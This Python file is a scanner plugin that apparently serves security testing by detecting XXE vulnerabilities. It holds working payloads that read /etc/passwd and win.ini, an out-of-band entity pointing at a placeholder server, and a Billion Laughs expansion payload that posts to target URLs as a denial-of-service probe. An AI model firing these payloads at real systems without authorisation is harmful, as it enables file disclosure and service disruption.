"""
XXE (XML External Entity) Detection Plugin

This plugin detects XML External Entity vulnerabilities in applications that parse XML.

Detection techniques:
- XML endpoint identification
- XXE injection payload testing
- Out-of-band (OOB) XXE detection
- Blind XXE detection
- DTD entity expansion testing
"""

import logging
import re
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, parse_qs, urlparse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

from scanner.scan_plugins.base_scan_plugin import BaseScanPlugin, VulnerabilityFinding

logger = logging.getLogger(__name__)


class XXEDetectorPlugin(BaseScanPlugin):
    """
    XXE vulnerability detection plugin.
    
    Detects XML External Entity vulnerabilities through:
    - Classic XXE payload injection
    - Entity expansion attacks
    - Out-of-band XXE detection
    - Blind XXE techniques
    """
    
    # Classic XXE payloads for file reading
    XXE_PAYLOADS = [
        # Linux file read
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',
        
        # Windows file read
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>''',
        
        # Parameter entity
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>
<foo>test</foo>''',
    ]
    
    # XXE payloads for OOB detection
    OOB_XXE_PAYLOADS = [
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://YOUR_SERVER/">
%xxe;
]>
<foo>test</foo>''',
    ]
    
    # Entity expansion (Billion Laughs) payloads
    EXPANSION_PAYLOADS = [
        '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',
    ]
    
    # File signature patterns
    FILE_SIGNATURES = {
        '/etc/passwd': [r'root:.*:0:0:', r'daemon:', r'/bin/'],
        'win.ini': [r'\[fonts\]', r'\[extensions\]'],
    }
    
    @property
    def plugin_id(self) -> str:
        return 'xxe_detector'
    
    @property
    def name(self) -> str:
        return 'XXE Vulnerability Detector'
    
    @property
    def description(self) -> str:
        return 'Detects XML External Entity (XXE) vulnerabilities in XML parsing endpoints'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    @property
    def vulnerability_types(self) -> List[str]:
        return ['xxe']
    
    def scan(self, url: str, config: Optional[Dict[str, Any]] = None) -> List[VulnerabilityFinding]:
        """
        Scan for XXE vulnerabilities.
        
        Args:
            url: Target URL to scan
            config: Configuration dictionary
        
        Returns:
            List of vulnerability findings
        """
        if not HAS_REQUESTS:
            logger.warning("requests library not available")
            return []
        
        config = config or self.get_default_config()
        findings = []
        
        try:
            verify_ssl = config.get('verify_ssl', False)
            timeout = config.get('timeout', 10)
            
            # Test for classic XXE
            if config.get('test_entity_expansion', True):
                xxe_findings = self._test_classic_xxe(url, verify_ssl, timeout)
                findings.extend(xxe_findings)
            
            # Test for entity expansion (DoS)
            if config.get('test_expansion', True) and not findings:
                expansion_findings = self._test_entity_expansion(url, verify_ssl, timeout)
                findings.extend(expansion_findings)
            
            logger.info(f"XXE scan of {url} found {len(findings)} potential vulnerability(ies)")
            
        except requests.RequestException as e:
            logger.error(f"Error scanning {url} for XXE: {e}")
        except Exception as e:
            logger.error(f"Unexpected error during XXE scan of {url}: {e}")
        
        return findings
    
    def _test_classic_xxe(self, url: str, verify_ssl: bool, timeout: int) -> List[VulnerabilityFinding]:
        """Test for classic XXE vulnerabilities."""
        findings = []
        
        try:
            # Test if endpoint accepts XML
            headers = {'Content-Type': 'application/xml'}
            
            for payload in self.XXE_PAYLOADS:
                try:
                    response = requests.post(
                        url,
                        data=payload,
                        headers=headers,
                        timeout=timeout,
                        verify=verify_ssl
                    )
                    
                    # Check for file content in response
                    response_text = response.text
                    
                    # Check for /etc/passwd indicators
                    if any(re.search(pattern, response_text) for pattern in self.FILE_SIGNATURES['/etc/passwd']):
                        finding = VulnerabilityFinding(
                            vulnerability_type='xxe',
                            severity='critical',
                            url=url,
                            description='XXE vulnerability detected - able to read /etc/passwd',
                            evidence=f'Payload succeeded in reading file, found passwd content in response',
                            remediation='Disable XML external entity processing, use safe XML parsers, validate and sanitize XML input.',
                            confidence=0.95,
                            cwe_id='CWE-611'  # XML External Entities
                        )
                        findings.append(finding)
                        logger.info(f"Found XXE vulnerability at {url}")
                        return findings
                    
                    # Check for win.ini indicators
                    if any(re.search(pattern, response_text, re.IGNORECASE) for pattern in self.FILE_SIGNATURES['win.ini']):
                        finding = VulnerabilityFinding(
                            vulnerability_type='xxe',
                            severity='critical',
                            url=url,
                            description='XXE vulnerability detected - able to read win.ini',
                            evidence=f'Payload succeeded in reading Windows file',
                            remediation='Disable XML external entity processing, use safe XML parsers.',
                            confidence=0.95,
                            cwe_id='CWE-611'
                        )
                        findings.append(finding)
                        logger.info(f"Found XXE vulnerability at {url}")
                        return findings
                    
                    # Check for XML error messages that might indicate XXE parsing
                    error_indicators = [
                        'java.io.FileNotFoundException',
                        'XML External Entity',
                        'External Entity',
                        'DOCTYPE',
                        'ENTITY',
                    ]
                    
                    if any(indicator in response_text for indicator in error_indicators):
                        finding = VulnerabilityFinding(
                            vulnerability_type='xxe',
                            severity='medium',
                            url=url,
                            description='Possible XXE vulnerability - XML entity processing detected',
                            evidence=f'XML error message in response indicates entity processing',
                            remediation='Disable XML external entity processing.',
                            confidence=0.6,
                            cwe_id='CWE-611'
                        )
                        findings.append(finding)
                        return findings
                
                except Exception as e:
                    logger.debug(f"Error testing XXE payload: {e}")
        
        except Exception as e:
            logger.error(f"Error in classic XXE testing: {e}")
        
        return findings
    
    def _test_entity_expansion(self, url: str, verify_ssl: bool, timeout: int) -> List[VulnerabilityFinding]:
        """Test for entity expansion (Billion Laughs) attacks."""
        findings = []
        
        try:
            headers = {'Content-Type': 'application/xml'}
            
            for payload in self.EXPANSION_PAYLOADS:
                try:
                    # Send expansion payload
                    response = requests.post(
                        url,
                        data=payload,
                        headers=headers,
                        timeout=timeout + 5,  # Allow more time
                        verify=verify_ssl
                    )
                    
                    # If server responds slowly or errors, might indicate expansion attack worked
                    if response.elapsed.total_seconds() > 3:
                        finding = VulnerabilityFinding(
                            vulnerability_type='xxe',
                            severity='high',
                            url=url,
                            description='Possible XXE entity expansion vulnerability (DoS)',
                            evidence=f'Server took {response.elapsed.total_seconds():.2f}s to respond to expansion payload',
                            remediation='Disable entity expansion, limit entity nesting depth.',
                            confidence=0.7,
                            cwe_id='CWE-776'  # Entity Expansion
                        )
                        findings.append(finding)
                        return findings
                
                except requests.Timeout:
                    # Timeout might indicate successful expansion attack
                    finding = VulnerabilityFinding(
                        vulnerability_type='xxe',
                        severity='high',
                        url=url,
                        description='XXE entity expansion vulnerability detected (timeout)',
                        evidence='Server timeout on entity expansion payload',
                        remediation='Disable entity expansion, limit entity nesting depth.',
                        confidence=0.75,
                        cwe_id='CWE-776'
                    )
                    findings.append(finding)
                    return findings
                except Exception as e:
                    logger.debug(f"Error testing entity expansion: {e}")
        
        except Exception as e:
            logger.error(f"Error in entity expansion testing: {e}")
        
        return findings
    
    def get_default_config(self) -> Dict[str, Any]:
        """Return default configuration for XXE scanning."""
        return {
            'verify_ssl': False,
            'timeout': 10,
            'test_entity_expansion': True,
            'test_external_entities': True,
            'test_expansion': True,
            'oob_server': None,  # Out-of-band server for XXE detection
        }
